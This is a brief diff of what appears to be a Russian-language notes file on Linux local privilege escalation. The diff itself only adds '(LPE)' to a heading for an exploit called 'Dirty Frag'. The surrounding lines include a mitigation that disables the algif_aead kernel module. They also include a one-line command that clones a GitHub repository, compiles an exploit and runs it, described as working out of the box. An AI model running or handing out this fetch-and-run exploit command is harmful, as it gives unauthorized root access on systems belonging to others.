@@ -228,7 +228,7 @@ g.system("su")
         echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
         rmmod algif_aead 2>/dev/null
 
-        Dirty Frag
+        Dirty Frag        (LPE)
 
         1. Однострочная команда с компиляций и запуском git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
         2. Работает из коробки
